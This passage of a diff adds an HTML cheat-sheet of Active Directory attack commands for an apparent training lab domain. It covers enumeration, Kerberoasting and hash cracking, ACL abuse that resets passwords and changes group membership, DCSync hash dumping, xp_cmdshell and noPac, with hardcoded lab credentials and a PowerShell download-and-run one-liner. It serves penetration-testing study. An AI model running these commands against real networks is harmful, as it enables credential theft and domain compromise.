+<td><code>Find-LAPSDelegatedGroups</code></td>
+<td>A <code>LAPSToolkit</code> function that discovers <code>LAPS Delegated Groups</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Find-AdmPwdExtendedRights</code></td>
+<td>A <code>LAPSTookit</code> function that checks the rights on each computer with LAPS enabled for any groups with read access and users with <code>All Extended Rights</code>. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-LAPSComputers</code></td>
+<td>A <code>LAPSToolkit</code> function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="credentialed-enumeration">Credentialed Enumeration</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25</code></td>
+<td>Connects to a Windows target using valid credentials. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code></td>
+<td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover more users (<code>--users</code>) in a target Windows domain. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</code></td>
+<td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover groups (<code>--groups</code>) in a target Windows domain. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users</code></td>
+<td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to check for a list of logged on users (<code>--loggedon-users</code>) on the target Windows host. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code></td>
+<td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover any smb shares (<code>--shares</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share</code></td>
+<td>Authenticates with a Windows target over <code>smb</code> using valid credentials and utilizes the CrackMapExec module (<code>-M</code>) <code>spider_plus</code> to go through each readable share (<code>Dev-share</code>) and list all readable files.  The results are outputted in <code>JSON</code>. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</code></td>
+<td>Enumerates the target Windows domain using valid credentials and lists shares &amp; permissions available on each within the context of the valid credentials used and the target Windows host (<code>-H</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only</code></td>
+<td>Enumerates the target Windows domain using valid credentials and performs a recursive listing (<code>-R</code>) of the specified share (<code>SYSVOL</code>) and only outputs a list of directories (<code>--dir-only</code>) in the share. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>rpcclient $&gt; queryuser 0x457</code></td>
+<td>Enumerates a target user account in a Windows domain using its relative identifier (<code>0x457</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>rpcclient $&gt; enumdomusers</code></td>
+<td>Discovers user accounts in a target Windows domain and their associated relative identifiers (<code>rid</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125</code></td>
+<td>Impacket tool used to connect to the <code>CLI</code>  of a Windows target via the <code>ADMIN$</code> administrative share with valid credentials. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5</code></td>
+<td>Impacket tool used to connect to the <code>CLI</code> of a Windows target via <code>WMI</code> with valid credentials. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>windapsearch.py -h</code></td>
+<td>Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 --da</code></td>
+<td>Used to enumerate the domain admins group (<code>--da</code>) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 -PU</code></td>
+<td>Used to perform a recursive search (<code>-PU</code>) for users with nested permissions using valid credentials. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all</code></td>
+<td>Executes the python implementation of BloodHound (<code>bloodhound.py</code>) with valid credentials and specifies a name server (<code>-ns</code>) and target Windows domain (<code>inlanefreight.local</code>)  as well as runs all checks (<code>-c all</code>). Runs using valid credentials. Performed from a Linux-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="enumeration-by-living-off-the-land">Enumeration by Living Off the Land</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Get-Module</code></td>
+<td>PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Import-Module ActiveDirectory</code></td>
+<td>Loads the <code>Active Directory</code> PowerShell module from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADDomain</code></td>
+<td>PowerShell cmd-let used to gather Windows domain information from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName</code></td>
+<td>PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by <code>ServicePrincipalName</code>. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADTrust -Filter *</code></td>
+<td>PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (<code>-Filter *</code>). Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADGroup -Filter * \| select name</code></td>
+<td>PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (<code>select name</code>). Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADGroup -Identity "Backup Operators"</code></td>
+<td>PowerShell cmd-let used to search for a specifc group (<code>-Identity "Backup Operators"</code>). Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADGroupMember -Identity "Backup Operators"</code></td>
+<td>PowerShell cmd-let used to discover the members of a specific group (<code>-Identity "Backup Operators"</code>). Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Export-PowerViewCSV</code></td>
+<td>PowerView script used to append results to a <code>CSV</code> file. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>ConvertTo-SID</code></td>
+<td>PowerView script used to convert a <code>User</code> or <code>Group</code> name to it's <code>SID</code>. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainSPNTicket</code></td>
+<td>PowerView script used to request the kerberos ticket for a specified service principal name (<code>SPN</code>). Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-Domain</code></td>
+<td>PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainController</code></td>
+<td>PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser</code></td>
+<td>PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainComputer</code></td>
+<td>PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainGroup</code></td>
+<td>PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainOU</code></td>
+<td>PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Find-InterestingDomainAcl</code></td>
+<td>PowerView script used to find object <code>ACLs</code> in the domain with modification rights set to non-built in objects. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainGroupMember</code></td>
+<td>PowerView script used to return the members of a specific domain group. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainFileServer</code></td>
+<td>PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainDFSShare</code></td>
+<td>PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainGPO</code></td>
+<td>PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainPolicy</code></td>
+<td>PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-NetLocalGroup</code></td>
+<td>PowerView script used to  enumerate local groups on a local or remote machine. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-NetLocalGroupMember</code></td>
+<td>PowerView script enumerate members of a specific local group. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-NetShare</code></td>
+<td>PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-NetSession</code></td>
+<td>PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Test-AdminAccess</code></td>
+<td>PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Find-DomainUserLocation</code></td>
+<td>PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Find-DomainShare</code></td>
+<td>PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Find-InterestingDomainShareFile</code></td>
+<td>PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Find-LocalAdminAccess</code></td>
+<td>PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainTrust</code></td>
+<td>PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ForestTrust</code></td>
+<td>PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainForeignUser</code></td>
+<td>PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainForeignGroupMember</code></td>
+<td>PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainTrustMapping</code></td>
+<td>PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainGroupMember -Identity "Domain Admins" -Recurse</code></td>
+<td>PowerView script used to list all the members of a target group (<code>"Domain Admins"</code>) through the use of the recurse option (<code>-Recurse</code>). Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></td>
+<td>PowerView script used to find users on the target Windows domain that have the <code>Service Principal Name</code> set. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data</code></td>
+<td>Runs a tool called <code>Snaffler</code> against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="transfering-files">Transfering Files</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo python3 -m http.server 8001</code></td>
+<td>Starts a python web server for quick hosting of files. Performed from a Linux-basd host.</td>
+</tr>
+<tr>
+<td><code>"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"</code></td>
+<td>PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/</code></td>
+<td>Starts a impacket <code>SMB</code> server for quick hosting of a file. Performed from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kerberoasting">Kerberoasting</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo python3 -m pip install .</code></td>
+<td>Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>GetUserSPNs.py -h</code></td>
+<td>Impacket tool used to display the options and functionality of <code>GetUserSPNs.py</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday</code></td>
+<td>Impacket tool used to get a list of <code>SPNs</code> on the target Windows domain from  a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request</code></td>
+<td>Impacket tool used to download/request (<code>-request</code>) all TGS tickets for offline processing from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev</code></td>
+<td>Impacket tool used to download/request (<code>-request-user</code>) a TGS ticket for a specific user account (<code>sqldev</code>) from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs</code></td>
+<td>Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (<code>-outputfile sqldev_tgs</code>) linux-based host.</td>
+</tr>
+<tr>
+<td><code>hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force</code></td>
+<td>Attempts to crack the Kerberos (<code>-m 13100</code>) ticket hash (<code>sqldev_tgs</code>) using <code>hashcat</code> and a wordlist (<code>rockyou.txt</code>) from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>setspn.exe -Q */*</code></td>
+<td>Used to enumerate <code>SPNs</code> in a target Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Add-Type -AssemblyName System.IdentityModel  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"</code></td>
+<td>PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }</code></td>
+<td>Used to download/request all TGS tickets from a WIndows-based host.</td>
+</tr>
+<tr>
+<td><code>mimikatz # base64 /out:true</code></td>
+<td><code>Mimikatz</code> command that ensures TGS tickets are extracted in <code>base64</code> format from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>kerberos::list /export</code></td>
+<td><code>Mimikatz</code> command used to extract the TGS tickets from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>echo "&lt;base64 blob&gt;" \|  tr -d \\n</code></td>
+<td>Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.</td>
+</tr>
+<tr>
+<td><code>cat encoded_file \| base64 -d &gt; sqldev.kirbi</code></td>
+<td>Used to output a file (<code>encoded_file</code>) into a .kirbi file in base64 (<code>base64 -d &gt; sqldev.kirbi</code>) format from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>python2.7 kirbi2john.py sqldev.kirbi</code></td>
+<td>Used to extract the <code>Kerberos ticket</code>. This also creates a file called <code>crack_file</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file &gt; sqldev_tgs_hashcat</code></td>
+<td>Used to modify the <code>crack_file</code> for <code>Hashcat</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>cat sqldev_tgs_hashcat</code></td>
+<td>Used to view the prepared hash from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt</code></td>
+<td>Used to crack the prepared Kerberos ticket hash (<code>sqldev_tgs_hashcat</code>) using a wordlist (<code>rockyou.txt</code>) from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>Import-Module .\PowerView.ps1  Get-DomainUser * -spn \| select samaccountname</code></td>
+<td>Uses PowerView tool to extract <code>TGS Tickets</code> . Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat</code></td>
+<td>PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for <code>Hashcat</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation</code></td>
+<td>Exports all TGS tickets to a <code>.CSV</code> file (<code>ilfreight_tgs.csv</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>cat .\ilfreight_tgs.csv</code></td>
+<td>Used to view the contents of the .csv file from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>.\Rubeus.exe</code></td>
+<td>Used to view the options and functionality possible with the tool <code>Rubeus</code>. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>.\Rubeus.exe kerberoast /stats</code></td>
+<td>Used to check the kerberoast stats (<code>/stats</code>) within the target Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</code></td>
+<td>Used to request/download TGS tickets for accounts with the <code>admin</code> count set to <code>1</code> then formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>) . Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>.\Rubeus.exe kerberoast /user:testspn /nowrap</code></td>
+<td>Used to request/download a TGS ticket for a specific user (<code>/user:testspn</code>) the formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>). Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes</code></td>
+<td>PowerView tool used to check the <code>msDS-SupportedEncryptionType</code> attribute associated with a specific user account (<code>testspn</code>). Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt</code></td>
+<td>Used to attempt to crack the ticket hash using a wordlist (<code>rockyou.txt</code>) from a Linux-based host .</td>
+</tr>
+</tbody>
+</table>
+<h2 id="acl-enumeration-tactics">ACL Enumeration &amp; Tactics</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Find-InterestingDomainAcl</code></td>
+<td>PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Import-Module .\PowerView.ps1  $sid = Convert-NameToSid wley</code></td>
+<td>Used to import PowerView and retrieve the <code>SID</code> of a specific user account (<code>wley</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainObjectACL -Identity * \| ? {$_.SecurityIdentifier -eq $sid}</code></td>
+<td>Used to find all Windows domain objects that the user has rights over by mapping the user's <code>SID</code> to the <code>SecurityIdentifier</code> property from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$guid= "00299570-246d-11d0-a768-00aa006e0529"   Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \| Select Name,DisplayName,DistinguishedName,rightsGuid \| ?{$_.rightsGuid -eq $guid} \| fl</code></td>
+<td>Used to perform a reverse search &amp; map to a <code>GUID</code> value from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainObjectACL -ResolveGUIDs -Identity * \| ? {$_.SecurityIdentifier -eq $sid}</code></td>
+<td>Used to discover a domain object's ACL by performing a search based on GUID's (<code>-ResolveGUIDs</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADUser -Filter * \| Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</code></td>
+<td>Used to discover a group of user accounts in a target Windows domain and add the output to a text file (<code>ad_users.txt</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" \| Select-Object Path -ExpandProperty Access \| Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}</code></td>
+<td>A <code>foreach loop</code> used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(<code>ad_users.txt</code>) to the <code>Get-ADUser</code> cmdlet, then enumerates access rights of those users. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)</code></td>
+<td>Used to create a <code>PSCredential Object</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force</code></td>
+<td>Used to create a <code>SecureString Object</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</code></td>
+<td>PowerView tool used to change the password of a specifc user (<code>damundsen</code>) on a target Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADGroup -Identity "Help Desk Level 1" -Properties * \| Select -ExpandProperty Members</code></td>
+<td>PowerView tool used view the members of a target security group (<code>Help Desk Level 1</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose</code></td>
+<td>PowerView tool used to add a specifc user (<code>damundsen</code>) to a specific security group (<code>Help Desk Level 1</code>) in a target Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainGroupMember -Identity "Help Desk Level 1" \| Select MemberName</code></td>
+<td>PowerView tool used to view the members of a specific security group (<code>Help Desk Level 1</code>) and output only the username of each member (<code>Select MemberName</code>) of the group from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose</code></td>
+<td>PowerView tool used create a fake <code>Service Principal Name</code> given a sepecift user (<code>adunn</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</code></td>
+<td>PowerView tool used to remove the fake <code>Service Principal Name</code> created during the attack from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose</code></td>
+<td>PowerView tool used to remove a specific user (<code>damundsent</code>) from a specific security group (<code>Help Desk Level 1</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>ConvertFrom-SddlString</code></td>
+<td>PowerShell cmd-let used to covert an <code>SDDL string</code> into a readable format. Performed from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="dcsync">DCSync</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Get-DomainUser -Identity adunn  \| select samaccountname,objectsid,memberof,useraccountcontrol \|fl</code></td>
+<td>PowerView tool used to view the group membership of a specific user (<code>adunn</code>) in a target Windows domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl</code></td>
+<td>Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool <code>Get-ObjectAcl</code> to check a specific user's replication rights. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss</code></td>
+<td>Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (<code>172.16.5.5</code>) and save the extracted hashes to an file (<code>inlanefreight_hashes</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</code></td>
+<td>Uses <code>Mimikatz</code> to perform a <code>dcsync</code> attack from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="privileged-access">Privileged Access</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"</code></td>
+<td>PowerView based tool to used to enumerate the <code>Remote Desktop Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"</code></td>
+<td>PowerView based tool to used to enumerate the <code>Remote Management Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force</code></td>
+<td>Creates a variable (<code>$password</code>) set equal to the password (<code>Klmcargo2</code>) of a user from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)</code></td>
+<td>Creates a variable (<code>$cred</code>) set equal to the username (<code>forend</code>) and password (<code>$password</code>) of a target domain account from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred</code></td>
+<td>Uses the PowerShell cmd-let <code>Enter-PSSession</code> to establish a PowerShell session with a target over the network (<code>-ComputerName ACADEMY-EA-DB01</code>) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (<code>$cred</code> &amp; <code>$password</code>).</td>
+</tr>
+<tr>
+<td><code>evil-winrm -i 10.129.201.234 -u forend</code></td>
+<td>Used to establish a PowerShell session with a Windows target from a Linux-based host using <code>WinRM</code>.</td>
+</tr>
+<tr>
+<td><code>Import-Module .\PowerUpSQL.ps1</code></td>
+<td>Used to import the <code>PowerUpSQL</code> tool.</td>
+</tr>
+<tr>
+<td><code>Get-SQLInstanceDomain</code></td>
+<td>PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'</code></td>
+<td>PowerUpSQL tool used to connect to connect to a SQL server and query the version (<code>-query 'Select @@version'</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>mssqlclient.py</code></td>
+<td>Impacket tool used to display the functionality and options provided with <code>mssqlclient.py</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</code></td>
+<td>Impacket tool used to connect to a MSSQL server from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>SQL&gt; help</code></td>
+<td>Used to display mssqlclient.py options once connected to a MSSQL server.</td>
+</tr>
+<tr>
+<td><code>SQL&gt; enable_xp_cmdshell</code></td>
+<td>Used to enable <code>xp_cmdshell stored procedure</code> that allows for executing OS commands via the database from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>xp_cmdshell whoami /priv</code></td>
+<td>Used to enumerate rights on a system using <code>xp_cmdshell</code>.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="nopac">NoPac</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo git clone https://github.com/Ridter/noPac.git</code></td>
+<td>Used to clone a <code>noPac</code> exploit using git. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</code></td>
